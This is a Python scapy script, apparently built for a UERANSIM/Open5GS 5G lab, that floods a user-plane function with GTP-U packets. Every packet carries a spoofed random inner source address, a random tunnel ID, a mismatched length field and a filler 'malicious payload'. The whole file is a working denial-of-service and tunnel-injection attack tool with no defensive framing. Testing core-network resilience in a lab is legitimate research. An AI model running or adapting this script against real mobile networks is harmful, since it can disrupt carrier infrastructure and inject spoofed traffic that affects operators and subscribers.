#!/usr/bin/env python3
import subprocess
import random
import time
from scapy.all import IP, UDP, Raw, sendp
from scapy.contrib.gtp import GTPHeader

# Target IP (e.g., UPF or external server reachable via Open5GS UPF)
TARGET_IP = "10.45.0.1"  # Adjust to your UPF or server IP
INTERFACE = "uesimtun0"  # UE's TUN interface in UERANSIM

# Function to generate a random IP address for the inner packet
def random_ip():
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"


# Function to create a GTP-U packet with a random inner source IP
def create_gtp_packet():
    # Inner IP packet with random source IP (simulating spoofed or malicious data)
    inner_ip = IP(src=random_ip(), dst="8.8.8.8")  # Public IP as dummy destination
    inner_udp = UDP(sport=random.randint(1024, 65535), dport=54321)
    inner_payload = Raw(b"Malicious payload " * 10)  # Arbitrary payload
    inner_packet = inner_ip / inner_udp / inner_payload

    # GTP-U header encapsulating the inner packet
    # TEID should match a valid PDU session or be random for attack
    gtp_packet = (
        IP(src="10.45.0.2", dst=TARGET_IP) /  # UE's IP to UPF/server
        UDP(sport=2152, dport=2152) /         # Standard GTP-U port
        GTPHeader(version=1, PT=1, gtp_type=255, teid=random.randint(1, 1000000), length=random.randint(100,500)) /
        inner_packet
    )

    return gtp_packet

# Ensure hping3 or other flooding isn't running to avoid interference
try:
    subprocess.run(["pkill", "-f", "hping3"], check=False)
except:
    pass

# Main loop to send packets
packet_count = 0
max_packets = 100000  # Stop after 100,000 packets
inter = 0.0002       # 200 microseconds delay between sends

print(f"Sending GTP-U attack packets from {INTERFACE} to {TARGET_IP}...")
try:
    while packet_count < max_packets:
        # Create a new packet
        pkt = create_gtp_packet()

        # Send a random number of packets (0 to 10) per iteration
        num_packets = random.randint(0, 10)
        sendp(pkt, iface=INTERFACE, count=num_packets, inter=inter, verbose=0)

        # Update packet count
        packet_count += num_packets

        # Add a delay to control the rate
        time.sleep(inter)

except KeyboardInterrupt:
    print("\nStopped by user.")
except Exception as e:
    print(f"Error: {e}")
finally:
    print(f"Sent {packet_count} packets in total.")